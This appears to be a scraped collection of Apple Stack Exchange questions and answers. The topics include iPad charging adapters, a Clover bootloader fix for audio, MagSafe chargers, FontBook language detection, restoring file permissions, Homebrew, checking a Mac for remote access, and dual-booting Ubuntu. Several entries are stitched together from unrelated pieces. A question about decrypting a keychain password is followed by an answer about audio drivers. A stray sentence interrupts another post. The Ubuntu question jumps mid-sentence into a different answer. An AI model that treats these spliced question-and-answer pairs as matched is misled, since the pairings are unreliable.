shot.\n\n\n\nA: Yes, although currently the hardware you need is a bit of a mess.\nYou can use Apple's \"USB-C Digital AV Multiport Adapter\" which you plugin into the USB-C socket on the iPad Pro. Then you connect the charger to the USB-C socket on the adapter. This takes care of the charging.\nThe adapter allows you to simultaneously connect a data device using the USB 3 port, which unfortunately for you is in the form of a USB-A socket.\nI would highly recommend replacing the cable from your data device with one with a USB-A plug. This is often possible with external SSDs and similar devices.\nYou could also buy a simple adapter which plugs into that socket and provide a female USB-C socket, thus allowing you to connect the USB-C device for data. These adapters comes in many shapes and sizes, but an example could be this one.\nHowever this cannot be recommended as those products are not USB standards compliant, which in the case of incorrect usage could damage the iPad and/or start an electrical fire in the most severe case.\n", "Q: Apple Music/iTunes I have 2 separate Apple IDs - one for personal and personal devices. Then I have another separate Apple ID and iPad device for the business that other employees can access as well. How can I log in to ONLY the Apple Music app on the iPad to use in the store?\n\nA: The Apple Music component of iCloud is tied in to the main AppleID signed into the device. So firstly sign in to the device in the Settings app with the AppleID that you want to use the for Apple Music.\nStill in Settings, go to the iCloud section and turn off all iCloud services that you dont need e.g. Photos, Mail etc.\nYou will probably want to increase the security so no changes can be made to the account without a passcode.\nThen go to the App Store app, tap Featured and scroll to the bottom. Tap on AppleID, then Sign Out.\nThen Sign In with the business AppleID and you will be able to install all the apps associated with that AppleID.\nIf this is inappropriate then it sounds like playing Apple Music directly off the device may not be a good solution. There are many options for playing back music from a local server e.g. the Synology NAS allows using a free app DSMusic for playing music from a library stored on the NAS.\n", "Q: Does app store show a limited impressions for every account?

You may avail of this\n\n\nA: \nDoes apple have something like a quota \"limited views monthly\" for every developer account?\n\nNo.\n\nI used to to get about 150-200k impressions in the first 1-2 days for every new app I publish in the old days = means more installs too but this is no longer happens.\n\nThese impressions were probably from users browsing the App Store's list of newly added apps. The App Store no longer surfaces any such list; you will need to find other ways to bring your app to users' attention.\n(There are some lists of \"New Apps We Love\" and \"Best New Updates\", but these lists are manually curated -- not all new or updated apps will show up on them.)\n\nIs it legal to have more than account on app store?\n\nI'm not aware of any specific rules against it, but it won't do you any good here.\n", "Q: find my apple store password by keychain I get the apple store  password like this by keychain，How to decrypt this password.

Do I need to update ResetHDA?\nThanks\n\nA: I noticed from the screenshots you attached that there doesn't seem to be any audio device installed, as far as macOS is concerned. This is the category I expected you to find: \n\nYou'll notice it lists ALC892 under Codec Name*. This is the codec used by the audio chip in my Mac. Knowing your codec would allow you to choose and install a 3rd party driver for your audio chip, and in my case this was enough to fix the issue of no output device appearing on one of my Macs. Upon further consideration however, this may not be the root issue.\nI would recommend you do an NVRAM reset, if that will allow the output device to show up. Check the application again after doing so, and if the category is present take another screenshot, or write down the listed codec. Then put the machine to sleep, wake it, check if the output device is gone, and check DPCIManager to see if the category/entries went with it. Also repeat the process, and try rebooting the machine rather than sleep/waking it to see if that causes the output device/DPCIManager entry to disappear.\nIf it is not present after waking/rebooting the machine, the issue is most likely one I experienced on another one of my Macs, that being that the HDA (High Def Audio) handler is not loading when the machine boots/wakes from sleep.\nIf it is an HDA handler issue, which it sounds like it may be based on your description, the only option I know of is to install a 3rd party bootloader that is capable of emulating your Mac's NVRAM (like Clover UEFI), and configuring it to manually reset the HDA handler on every boot/wake.\nThe bootloader method is rather easy to set up, and I managed to fix the HDA handler on one of my Macs failing to load at boot that way. It is a bit of an involved process, but I can give you a step-by-step if you decide to go that route.\nPlease be sure to update your question with any further information you find, and I will update my answer accordingly.\nUPDATE: In the first of your new post-NVRAM-reset screenshots I can see that your audio chip is registered and that the codec it uses has full macOS support. This confirms my theory that the HDA handler is failing to reset on reboot or wake. As I mentioned the only fix I am aware of for this issue is to install a 3rd party boot loader that can manually reset it on every boot/wake. I'll detail the steps to do so below.\n\nIn this example I will be using the Clover EFI boot loader, as it is my personal choice when I need to use a 3rd party loader, and is the one with which I have the most experience.\n\n1.) Grab the Clover EFI installer from here.\n2.) Run the installer (Right Click>Open), go through the pages, and click Customize when you get to this window: \n3.) Check the following boxes: \n\n*Clover for UEFI booting only\n      *Install Clover in the ESP  \nUnder UEFI Drivers drop-down \n\n*AudioDxe-64\n        *DataHubDxe-64\n        *FSInject-64\n        *SMCHelper-64\n        *VBoxHfs-64\n        *ApfsDriverLoader-64\n        *AptioMemoryFix-64\n        *EmuVariableUefi-64\n        *PartitionDxe-64\n        *Ps2MouseDxe-64\n        *UsbKbDxe-64\n        *UsbMouseDxe-64\n        *VBoxExt2-64\n        *VBoxExt4-64  \n\nUnder FileVault 2 UEFI Drivers drop-down \n\nEverything\n\n*Install RC scripts on target volume\n      *Install Clover Preference Pane\n\n4.) Double check to ensure everything listed is checked, and nothing that was not listed is checked. Once you have done so click the Install button.\n5.) Download the Clover Configurator from here.\n6.) Once it has been successfully installed, open it, and at the bottom of the screen click the path that reads EFI > EFI > CLOVER > config.plist. \n7.) Now go down to the Devices tab, and in the top right corner check the box labelled ResetHDA if it is not already. Make sure not to change any other options in any of the tabs. When you are done hit Command-S to save the config (only if you had to check the box, if it was already checked you are good to go.) \n8.) Reboot your machine. Once you have gone through Clover and booted back into macOS your audio output should be working fine, and the chip/jack should show up in DPCIManager and System Preferences>Sound>Output respectively.\n\n\nI have encountered this issue on multiple Macs, both official and Hackintosh alike, and this has consistently been able to resolve the problem. If you need any extra details or if something goes wrong, just let me know.\n", "Q: Can I use other brand laptop chargers instead of my macbook pro adapter? I recently watched a video on Youtube which claims you may charge your Mac through an adjustable power supply, by setting its output voltage on 18.5 and connecting your MacBook adapter’s wire (the one connected to the MagSafe connector) to the power supply. The circuitry at the top of the MagSafe connector determines how much power your mac is going to draw from the power supply, so even if the power supply supplies more voltage and/or amperage, your mac would not be allowed to draw more than the required power from the power supply. \nNow, I just want to know your ideas on this video and if you consider it safe? Does higher voltage, say, 20 v. hurt the chip located at the MagSafe connector or my MacBook’s logic board? And based on all this, may I use a different adaptor instead of my original mackbook MagSafe charger? An adapter like the following HP charger:\nHP PPP016H 18.5V 6.5A Laptop Charger\nThe link to the YouTube video:\nhttps://www.youtube.com/watch?v=B3w8nwyrdYw\n\nA: Let's start off by addressing the video you linked to....\nIt's a video by Louis Rossman of The Rossman Group the owner of a laptop repair facility that specializes in component level repair (repairing logic boards).  In it, he explains why he uses a bench top power supply to deliver exactly 18.5V; so he can monitor the amperage draw.  Suffice to say, it's not a \"wall wart\" he is using.\nThe MagSafe Adapter.\nThe MagSafe power adapter can supply voltages from 14.5V to 20VDC.  However, it's not the \"brick\" that determines if it can charge or not, it's the actual MagSafe adapter that actually determines whether or not it will interface with your Mac.  The brick just supplies the power.\nThe connector end is what communicates with your laptop and tells the brick how much power to supply.  Basically, the way it works is that it that it identifies the power supply as having so much capacity (wattage).  If it's enough, it will charge/power the laptop.  If not, it won't accept the voltage.\nThis is why you could use a 90W adapter on a Mac that came with a 40W but couldn't use a 40W adapter on a Mac that needed a 90W.  This is true with all other power supplies except Apple added some logic into their connector.\nIs it safe to Use a 3rd party power supply?\nIf you know what you're doing, then yes, it is.\nWill the 18.5V, 6.5A charger work?\nIt should because it's supplying 120 watts of power (18.5V * 6.5A = 120W; more than enough to satisfy any Mac.\nTL;DR\nYes, based on the info you supplied that power adapter will work.  Whether it's safe or not depends on your skills with DC power supplies and electrical circuits.\n", "Q: How to change a note background in the preview app from transparent to any other colour? When I add a note to a highlighted text (right click - Add Note), the background is transparent, which makes it difficult to read because it overlaps with the PDF text (example screenshot below). I know this does not happen when I add a note directly without linking it to a text. I could do it that way, but I prefer to have comments linked to a specific text I select. Does anybody know how to make the background not transparent? Thanks in advance.\n\n\nA: \nFirst click the note, then press the button shown in the picture and select a color.\n\nA: Thanks for the reply. I had tried that before, and that was the problem: I can only change the colour when the note is not linked to a highlighted text section. In the end I used normal notes (not linked to text) and I noticed that changing colour does not work properly for all the colours in the palette. In some cases, the \"minimized\" square does change to the selected colour, but when displaying the content of the note, its background is either transparent or yellow.\nI recently updated my macbook to Mojave, I don't know if that could be related.\n\nA: First, minimize the note and then right-click, there should be an option to change the color.\n\nA: If your annotation is set to Underline, the note will be transparent.\nTry this: set annotation to Underline in the Menu > Tools > Annotate.\nDouble-click to select a word to test that it will underline.\nGo to the toolbar, and in the dropdown of the Highlight icon select (e.g.) Yellow.\nNow double-click a word to highlight it in yellow. Then click with two fingers on a trackpad or use Ctrl-click to bring up the contextual menu... select \"Add Note\" ... the note will now be in yellow.\n", "Q: Replace MacBook Pro screen with Screen from old MacBook I have a 13” MacBook Pro mid 2014 as well as a late 2011 MacBook Pro.\nMy 2014 MacBook Pro screen is broken and I was wondering if I could replace it with the screen from my 2011 MacBook Pro.\nWill there be any issues during installation?\n\nA: No, it will not work.\nFirst, and most importantly, the LVDS connectors are not interchangeable.  The 2011 MacBook Pro uses the 30 pin LVDS connector while the 2014 uses the 40pin connector (left and right respectively).\n\n\nImages sourced from iFixit.com\nSecondly, the display assembly also contains the cables for the Wi-Fi and Bluetooth antennas as well as the iSight (webcam) cable.  All of which are in very different locations on each of their respective logic boards, thus very different cable lengths; they physically won't fit.\n", "Q: Increase shaken pointer size So there is \"shake mouse pointer to locate\" feature which makes pointer bigger when I'm shaking it.

I couldn't find any settings in preferences but maybe there is some config I can edit. \nI don't want to change regular pointer size, only shaking one\n\nA: You might have better luck with using a third party tool, like MouseScape \nI spent 2 hours just now trying to use Hopper to troubleshoot the System Preferences > Accessibility > Display Preference Pane while looking over the System files of the Mac to see if there is a config file that can be edited. It seems to me that the mouse is initialized with some API's like Appkit and CoreGraphics so doing more research with how to use these API's to edit your mouse is probably your way to go if you really want to do that. \nOtherwise, Mousescape could be your solution. Is there a reason you are trying to make it larger?\n", "Q: Edit Font Metadata so FontBook will put it in English smart collection? Some of my third party fonts don't show up in Yosemite Preview's font menu in the toolbox. I'm pretty sure that the only fonts available for Preview to use in annotation have to be in FontBook's default smart collection called \"English,\" which cannot be edited. When I compare the information of fonts that appear in \"English\" vs. those that don't, the common thread is that English appears in the \"Language\" metadata field (under \"information\") in fonts that show up in the English smart collection. I've used several free font editors looking for a way to add language metadata to fonts I'd like to have available in Preview, but I can't figure out how to do what I want. Can anyone help?\n\n\nA: With the help of Rob from Fontstruct.com, I figured it out. \nThe English smart collection depends on having a certain set of characters.\nThere are various \"official\" standards that tell people what characters have to be included in a font for what kind of language support, e.g. https://en.wikipedia.org/wiki/ISO/IEC_8859-1, but there's no single standard that absolutely every font foundry and font-vending website uses. I read a complaint that two foundries producing two fonts with the same set of glyphs can claim wildly different language support.\nBut there didn't seem to be an easy way (like a spreadsheet) of finding out the minimum number of characters needed for English support.\nThere are websites like FontDrop! https://fontdrop.info/  and tools built into font-designing software into which you can drop a font file and see what languages are supported, but you have to drill down to find out how those tools are determining language support. FontBook is more lax than FontDrop! about when it thinks there's English support, i.e., some fonts that don't show English support at Fontdrop! are listed by FontBook as having English language support.\nAnyway, what I did is find one of my 3rd party fonts that FontBook included in its English smart collection that also had relatively few glyphs. This font has all the characters in Unicode's \"Basic Latin\" set plus Ä, Å, ä, å, Ö, ö and ¨ (that's A/a with a diaresis and circle, O/o with a diaresis, plus the diaresis itself). On fontdrop.info, this font shows as having only Zulu language support, but in FontBook it has more, including Cornish, English, Indonesian, Malay, Somali, Swahili and a bunch of others I've never heard of (Asu, Bemba, Bena, Chiga, Congo Swahili, Gusii, Kalenjin, Kinyarwanda, Luo, Luyia, Machame, Makhuwa-Meetto, Makonde, Morisyen, North Ndebele, Nyankole, Oromo, Rombo, Rundi, Rwa, Samburu, Sangu, Shambala, Shona, Soga,Taita, Teso, Vunjo).\nI took one of my own custom fonts, which is meant to have only a few glyphs, and added dummy glyphs as needed for everything in Basic Latin + the diaresis (figuring that the other characters might not be needed if I had the diaresis) and voilà - the font appears in FontBook's English smart collection and can be used to annotate things in Preview.\nTo make life complicated, I've got another 3rd party font that FontBook put into the English smart collection that has only the 26 letters (caps and lowercase), numbers and an asterisk, but if you make a custom font that has everything in Basic Latin and nothing else (so the letters, numbers and an asterisk plus a bunch of other stuff), FontBook says the only language supported is Zulu - go figure.\nI made a test font that had just upper and lower case letters, numbers and an asterisk and FontBook put my test font into the English smart collection - but as I said, a test font with everything in Basic Latin, which actually has more characters, didn't go into the smart collection.\nOf course, Apple could make life simpler and make Preview able to \"show all fonts\" the way every other Mac app can, but...\nBTW, if anyone knows of a site that shows what characters are needed for what language support, I'd love to know about it.\n\nA: More info: Someone asked Apple how FontBook determines what languages are supported by a font and this is what Apple said:\n\nWe compare the [font's] cmap [character to glyph mapping table] to the ICU exemplar strings [provided by Unicode's CLDR project] for each language.\n  We just pick up the latest copy of the open source ICU database for each system release.\n\nMaybe Yosemite's FontBook is buggy, but that wouldn't explain why FontBook thought a font with a just 52 letters and 10 numerals and an asterisk supported English whereas one with the same characters plus more didn't.\nThere was also this discussion more recently. \nIt was suggested that we look at the exemplarCharacters tag in the Unicode CDLR XML files.\nHere's what the relevant section for English is in the most recent release (which might not be what was in the XML file when Yosemite was released)\nExemplar characters:\n    a b c d e f g h i j k l m n o p q r s t u v w x y z \nExemplar characters, type auxillary:\n    á à ă â å ä ã ā æ ç é è ĕ ê ë ē í ì ĭ î ï ī ñ ó ò ŏ ô ö ø ō œ ú ù ŭ û ü ū ÿ\nExemplar characters, type Index:\n    A B C D E F G H I J K L M N O P Q R S T U V W X Y Z \nNumbers and punctuation:\n    - , . % ‰ + 0 1 2 3 4 5 6 7 8 9 - ‐ – — , ; \\: ! ? . … ' ‘ ’ \" “ ” ( ) [ ]\n    § @ * / & # † ‡ ′ ″\n\nI know my older version of FontBook isn't using this data set, but (even ignoring the auxillary characters) I don't see how this information corresponds to what FontBook is telling me are supported languages because FontBook has lots of fonts in the English collection that don't have all the punctuation.\nI think one might be stuck doing what I did - determining what your particular version of FontBook thinks are English-supporting fonts by trial and error. If you really want to use a particular font for Preview annotations, adding dummy glyphs or maybe merging your font with a few characters from a related font.\nFor me, this was an interesting academic exercise. Having learned all this, I think I'll just do my annotations in a Mac app that can \"show all fonts\"\n", "Q: Weird LSCOLORS after copying files Recently I've done clean reinstall of MacOS and naturally I copied all of my important files to external drive and copied them back once I had a clean installed system. The problem is when I type ls in terminal to see my files all the directories have weird colour and all files are executable even though some of them didn't have that flag.\nNotice how all the directories in my home directory have normal colour to them and how the copied ones (in BashProfile directory) have a weird colour.\n\nAlso all the files that I've copied became executable (you can tell by the bright green colour) but of course the ones I copied into the directory not from external drive but from my home directory are normal like they are supposed to be. \nYou can see that all my .jpg files are executable for some reason.\n\nI am using this settings in my .bash_profile : \nexport CLICOLOR=1\nexport LSCOLORS=ExFxBxDxCxegedabagacad\n\nMy question is: Why were my directories and files affected when I copied them from external hard drive, what do this different colours mean on my directories and is there any possibility that I can revert this changes?\nI am running MacOS Mojave\nwiktor Pictures $ echo $LSCOLORS\nExFxBxDxCxegedabagacad\n\nAlso files that are green are indeed executable in contrast to white coloured files.\n\n\nAnd my drive's format is ExFAT\n\nA: The filesystem on the external storage device does not have a sense of Unix permissions. For example, the external drive may be formatted as one of the FAT variants of filesystems. When you copy the file from the external storage to the Mac's hard drive, it copies the permissions as they were found on the external drive.\nUse the idea below or variants of it change the permissions back to something standard on a Unix filesystem. Below, change all files in ~/Pictures with the extension, png, to 0644 (owner = read write, group = read, others = read) and  directories to 0755 (owner = read write execute, group read execute, other = read execute). In context of directories, execute provides the ability to change directory (cd) into the given directory. These are typical, default permissions.\nfind ~/Pictures -type f -name '*.png' -exec chmod 0644 {} +\nfind ~/Pictures -type d -exec chmod 0755 {} + \n\nThe type option, above, takes an abbreviated file type argument; f specifies regular files, and d specifies directories. The -exec option specifies what to do with found files. In this case, we want to \"change mode\" (chmod or change permissions). The {} is a list of found files. \nUse man find and man chmod for more information. Another nice resource for Unix commands is explainshell.com. \nSome of the files may require the execute bit. For example, if you have a script that you want to execute directly, use something such as the following (owner = read write execute, group = read execute, others = read execute).\nchmod 0755 script.sh\n\nThe permissions above are written in octal notation. Wikipedia has a nice summary of the meanings. After getting the permissions back to normal, the colors can provide the right visual hints again.\n", "Q: How to update shell programs How do I update shell programs like crontab for example?\nOn my Mac I've got version from 29th of December 1993, but on a server linux machine that I am using version of crontab is much better in terms of usability since it's from 19th of April 2010.\nI am running MacOS Mojave and my bash version is :\nGNU bash, version 5.0.2(1)-release (x86_64-apple-darwin18.2.0)\ncrontab on my Mac:\n\ncrontab on my Linux:\n\n\nA: The content of /usr/bin and friends is updated with each release of macOS, but usually the versions shipped by Apple are significantly older than what's available on Linux. There are various reasons for this, in a lot of cases it's related to changes in the GPL. In case of crontab it may also play a role that the use of cron is deprecated, launchd should be used instead.\nIf you want to update Unix binaries yourself\n\n\n*\n\n*Use Homebrew (https://brew.sh)\n\n*Compile from source yourself and install in /usr/local/bin\n\nA: Where is the executable?\ncommand -v cron\n\nThe result shows /usr/sbin/cron. System Integrity Protection (SIP) protects the contents of /usr; thus we cannot affect a change anyway as long as SIP is enabled. You installed BASH via Homebrew, I take it. Searching Homebrew for cron-related formulae or casks reveals no candidates (brew search cron), perhaps for reasons given by @nohillside. Perhaps cron was a bad example and a better example might be vim. As you have discovered, one can utilize a package manager like Homebrew or Macports to install more recent software. For each installed package, Homebrew, at least, installs a symbolic link to wherever the executable was installed (/usr/local/Cellar/[...]); thus, we could utilize a shell alias or modify the PATH environment variable to utilize better versions of common software. I use the shell alias approach.\nFor example, my shell is zsh, and I have installed MacVim. If the symbolic link for MacVim's version of vim exists (-h), then define a new alias. Now, every time I execute vim, I am not executing the vim located in /usr/bin; rather, I am executing the vim located in /usr/local/bin. The below test and definition works the same for bash.\n[ -h '/usr/local/bin/vim'  ] && alias vim='/usr/local/bin/vim'\n[ -h '/usr/local/bin/view' ] && alias view='/usr/local/bin/view'\n\nAnd then use the package manager to update the software periodically.\nif brew update 2>/dev/null; then\n    brew upgrade\n    brew cleanup\n    rm -rf \"$(brew --cache)\"\nfi\n\n", "Q: How can I detect if my computer has been remotely accessed and monitored by an employer? I work remotely as a freelancer, on a new imac I purchased specifically for this gig. Until recently, I had a seat on the client's Adobe Enterprise, and I frequently exchange files with the client. I became aware of suspicious activities, such as the cursor moving by itself, and clients making references to my work or computer activity, that they could not have known without access to my desktop, or mysterious system crashes. I have since tightened up my security, but: How can I detect the presence of a monitoring system, or perhaps, an undisclosed user, and prevent access to my computer, and a potential invasion of privacy?\n\nA: Assuming they're monitoring or remotely logging in to your machine, the computer itself would have to be configured to accept these connections. Open System Preferences>Sharing and go to the Screen Sharing tab, check whether it is on, if so whether it is set to allow access for all users or only specified ones. Do the same for the Remote Login tab, Remote Management tab, and Remote Apple Events tab.\nIf all of these are disabled, or access to these functions is restricted to users you know for a fact they do not have access to, try going to the Users & Groups preference pane, and check to see whether there are any Network-Sharing enabled users besides the administrator account, and if the Guest user is enabled, whether or not it has Remote Login access.\nIf none of the above are the case you may try checking the machine's SSH logs, assuming SSH has been enabled, to see if there have been any recent remote logins via the Terminal. Finally, of course, if there are any Remote Desktop applications installed, check their logs as well. I am not familiar with Adobe Enterprise, perhaps check the application settings to see if anything regarding remote monitoring or connections is mentioned.\nIf none of the above are relevant, or do not yield any results, you can always try going to the System Preferences>Security & Privacy pane, then the Firewall tab, turning on the Firewall, opening the Firewall Options... window, checking Automatically allow built in software to receive incoming connections, unchecking Automatically allow downloaded signed software to receive incoming connections, and checking Enable stealth mode. This will effectively block all incoming connections from whatever software is used for monitoring/remote login, and may even reveal what software is being used when it prompts for Firewall access during the next remote login attempt.\n", "Q: Installing Ubuntu on Mac with macOS Mojave I tried to follow steps in the article Installing Ubuntu on Mac with macOS and Windows already installed.\nBut I have a different file system.

Due to the fact that Ubuntu is based on Debian, the process should be similar enough to apply to both systems.\nDue to the way APFS works, the entire capacity of the Container disk is able to be used as needed by any and all Virtual Volumes inside of it. While this comes with the downside that resizing the Container to be smaller will limit available free space for all of its child volumes, it also comes with the upside that fewer partitions have to be resized/moved in order to create a new standard partition.\nFor the sake of recreating your situation I have connected a 250 GB external disk to my machine, and formatted it with a single APFS Container, which holds a single Virtual Volume. The first step in this proccess is to find the disk identifier of the Container disk. It can be found in the output of the terminal command diskutil apfs list. In my case this was disk4, as can be seen in the screenshot below. According to the output you listed above, your Container disk is disk1.\n\nTo resize the Container, first decide how much space you want to dedicate to Linux, then subtract that from the total size of the Container disk as listed under Size (Capacity Ceiling). In this example I will be dedicating 1/3rd (84 GB) of my external disk to Debian. Once you have the new total size for your Container disk figured out, run the command diskutil apfs resizeContainer disk4 166G, substituting disk4 and 166G for your Container disk identifier and desired macOS partition size.\nYou will now have the difference in free space on your disk. It is important to note that this free space will not show up in Disk Utility (or diskutil), but it will still be available to the partition manager in the Debian installer, which is where we'll do the remainder of our partitioning from.\n\nNow, either burn your installer image to a CD-R/CD-RW/DVD-R/DVD-RW (which I recommend), or write your installer to a USB disk by formatting it as GUID Partition Map and MS-DOS file system, then running the command sudo dd if=/path/to/installer.iso of=/dev/diskX bs=1M (where diskX is the disk number of your USB drive).\nReboot, and hold down the Option key at the chime/beep, and choose to boot from your Linux installer. Continue through the setup process until you reach the Partition Disks step, and choose the Manual option.\n\nAs previously mentioned, you'll find that the free space created is available here, and is listed under a partition with no file system, or volume label, according to Linux (this is your APFS Container disk).\n\nChoose the Free Space partition and click Continue, select the option Create A New Partition in the following menu, and at the prompt set the size to its current value minus the amount of RAM you have installed in your machine. You will need that extra few gigabytes to create a swap partition in a moment. When it asks you where in the free space you want the partition to be created, choose Beginning.\nSet the name to whatever you want, in this example I chose Main Disk. \nChoose what filesystem you want the partition to use (viable options are EXT3, EXT4, BTRFS, JFS, and XFS. Personally I recommend EXT4). \nChoose the mount point for the partition (default and recommended is /). \nChoose mount options (recommended to leave as default). \nCreate a label for the partition (this is what will be displayed in partition editors like GParted).\nClick Done setting up the partition.\n\nNow select the free space following the partition you just created, which should be equal to the quantity of RAM in your machine. Once again choose Create a new partition, and this time use the default size. Change the name of the partition to SWAP, and set the filesystem to swap area. Click Done setting up the partition.\n\nYour partition list should now contain the following partitions after your unlabelled APFS Container (with names, sizes, and partition numbers adjusted of course).\n\nAfter reviewing to make sure everything is correct, click Finish partitioning and write changes to disk. Allow the rest of the installer to proceed. If you get to a page that asks if you want to install the GRUB bootloader, choose No. The Startup Disk selector in System Preferences and the boot menu presented when holding down the Option key should be sufficient to boot into your new Linux installation.\nCongrats! You now have a machine that is dual booted with macOS and Linux.\n", "Q: Why my Mac Mini doesn't boot with external HDD attached? Ext HDD is 3,5\" 4TB WD RED (exFAT) in USB 2.0 box with external power supply (220v)\nWhen I restart my Mac Mini (late 2012, MacOS 10.14) in 90% the boot will end on black screen (no apple loading logo, no progress bar). When I turn off or disconnect my ext HDD (exFAT), or reset PRAM then the system will boot perfectly. Then I can reconnect my extHDD and everything will work (till next restart).\n\nA: Assuming you have not installed a third party dual boot loader such as rEFInd, go into the System Preferences and select the internal HD as the \"Startup Disk.\" If you have installed a third party boot loader it may be damaged or you may need to uninstall. If you don't know what a third party boot loader is; you probably don't have it. \n\nA: So problem was with extHDD on exFAT. After reformating to NTFS is everything OK.\n", "Q: Can I connect a Yamaha Clavinova CLP-230 to a MBAir using USB cable? I tried, using a USB A to USB B cable but the computer did not recognize the Clavinova CLP-230 in Garageband. Not sure where I am going wrong? Tried a different cable but still no luck. OS 10.13\n\nA: You'll need to install the Yamaha USB-MIDI driver first:\nhttps://dk.yamaha.com/da/support/updates/usb_midi_driver_for_mac.html\nThis driver works across all the Yamaha Clavina models with USB port for MIDI.\nWhen you have installed the driver, reboot the Mac and insert the USB-cable from Mac to piano. Then turn on the Piano. Finally start GarageBand, and the new MIDI device should be available for use.\n", "Q: Sync tiny calendar I have two iPhones running iOS 12.1.2, each with different Apple IDs. One phone (an iPhone 5S) has complete data for tiny calendar but incomplete contacts. The iPhone 5SE has complete contacts but incomplete calendar data.  I would like them to sync. Any ideas?\n\nA: If tiny calendar uses the built in calendar accounts like (some?) other third party calendar apps do, you can open Calendars.app and tap \"Calendars\" at the bottom, and then the \"i\" in a circle next to a calendar. From there you can share iCloud calendars that you have created. \nI'm not sure about contacts. You can share contacts one at a time from the contact, but that doesn't keep them in sync. And I don't see a way to do it more than one at a time. \n", "Q: How can I install an older version of iTunes? I need to install iTunes 12.6.5 per this article in order to be able to download iPad apps directly from iTunes (since that functionality was later removed from iTunes). So I've tried to follow the relatively simple instructions by downloading the installer package, and running it. However as soon as I try to open the \"Install iTunes\" app it says \"This software is not supported on your system.\"\nI'm running macOS 10.14.2 (Mojave). Do I need to somehow uninstall the existing version of iTunes first? I tried doing that by dragging it from Applications into the Trash, but that reported \"iTunes can't be modified or deleted because it's required by macOS.\"\n\nA: At the bottom of the article it says the version isn’t compatible with Mojave.\n\nThis version of iTunes is not compatible with macOS Mojave.\n\n", "Q: Can't write to Seagate external hard drive on other macbook pros I have a \"new\" 2gb Seagate external hdd.  I used it to copy files off of my old Macbook pro, circa 2014, which worked fine.\nI just plugged in the drive into my new Macbook pro, circa 2018.  I can read files off the external drive.  However, I can't copy files onto the drive from the new Macbook.  I grabbed my friend's Macbook (circa 2014 so same model as my old laptop) and same issue, I can read files from the external drive but I can't copy files onto the drive.  I don't have my old laptop anymore so I can't try to copy things to it.\nI plugged the hdd into a Windows 7 laptop, and I'm able to copy files onto the drive, create a new folder, etc.\nI found several links that said I need to reformat the hdd to make it usable with my Macbook but it makes no sense since my old Macbook was able to read/write to the drive without being reformatted but now with any other Macbook, it doesn't allow me to write, only read.\nWhat happened?  How come I can only read files from the hdd from any new Macbooks but a Windows laptop I can read and write?  Why does it seem like the drive is married to my old Macbook?  If it is married to it, how to I break this bond so I can use it with my new Macbook?\n\nA: If the drive is NTFS the MacOS default driver is read/only. \nYou probably have installed a driver at one time on your old system that provide read/write. \nSuch a driver frequently come with external harddisks. I have personally found this preloaded on recently purchased Seagate drives formatted as NTFS, but that only supported Seagate drives.  Paragon sells the full driver from https://www.paragon-software.com/home/ntfs-mac/ (they also have for other filesystems).\n", "Q: How to change my own apple id, so I can upgrade xcode I am using company's computer. When I tried to upgrade xcode, it pops up someone else's account. Can I change it to my email address (apple id), so I can upgrade xcode. I heard that I need to reinstall the computer can do that (but I don't want to reinstall it)\n\nA: Ask your employer to enter their administrators password so you can upgrade Xcode.\nIt sounds like your employer set you up with a normal account that needs an administers permission to do certain things, like update apps.\n", "Q: iOS notification issue I reset my all my settings on my iPhone and it messed up my notifications.\nThe problem is when I tap on my notification it slides to the left and makes me tap the open button. Before I could just tap on the notification itself once and it'd open right away.\n\n\nA: Your device must be unlocked (Face ID, Touch ID) for the notification to open immediately upon a direct touch. Otherwise, the notification will only let you slide to the left.\n", "Q: Is it safe to create a tarball of a Time Machine backup? Is it possible for me to create a .tar.gz, .tar.xz, etc file of a .backupdb? Are there any precautions I need to take to ensure that all permissions, hardlinks, etc are preserved? Will tar destroy the de-duplication used in Time Machine's backups?\n\nA: tar does not preserve all the information in the HFS filesystem.\nI would look at having it converted to a image file instead.  I believe Disk Utility can do this for a folder.\n", "Q: How can I delete duplicate entries in keyboard shortcuts services? I have several duplicate entries in the keyboard shortcuts services. \nI want to delete the duplicate entries, and right clicked and clicked show in Finder to find the location of these. But it leads to Applications folder. \nSo I tried find these location manually, but I could not. \n\n\nA: Custom services can be found in ~/Library/Services.\nIf showing the service in the finder led you to the Applications folder it's a service that came bundled with an app. These should be defined in that app's Info.plist.\nYou can access it by right clicking on that application in the Finder, selecting Show Package Contents and navigating to Contents.\nOnce you've opened the file look for the Services key. Expanding it will show you all services that come bundled with that app. Deleting a service's key might remove its entry from Keyboard > Shortcuts > Services. Be sure to make a backup of the .plist file first, in case something goes wrong and you want to roll back the changes. \n\nNote that you might need extra software (like Xcode) to open .plist files.\n\n", "Q: Hack to hide TeamViewer dock icon, issue with restarting app I don't like TeamViewer taking up space on the Dock. I followed this tutorial to hide the dock icon, leaving me with only a menubar icon, which works great. TeamViewer is set to start at login.\nHowever, in a MacBook Pro with discrete graphics, when logging into another computer, TeamViewer forces a switch to discrete graphics, and even after logging out of said computer, it stays that way, which is of course awful for battery life.\nI am forced to quit TeamViewer so I can go back to integrated graphics and decent battery life. However, if I try to launch TeamViewer again, it doesn't work -- I get a request to type my password to install a helper tool, and then nothing.\nWhat should I do to simulate whatever procedure is performed during system boot that allows TeamViewer to start?\n\nA: I solved the problem by running the following command in Terminal after killing the previous TeamViewer instance:\nsudo launchctl load /Library/LaunchDaemons/com.teamviewer.teamviewer_service.plist\n\nNext, I launch TeamViewer as usual. It shows up in the menu bar, as expected.\nFor those unfamiliar or uncomfortable with Terminal, the following AppleScript could be used, assuming TeamViewer is installed in /Applications:\ndo shell script \"launchctl load /Library/LaunchDaemons/com.teamviewer.teamviewer_service.plist\" with administrator privileges\ndo shell script \"open /Applications/TeamViewer.app\"\n\n", "Q: Permission of ~/.Trash is always gone after Time machine backup \nEvery day, permission of ~/.Trash is always gone(Pic1).

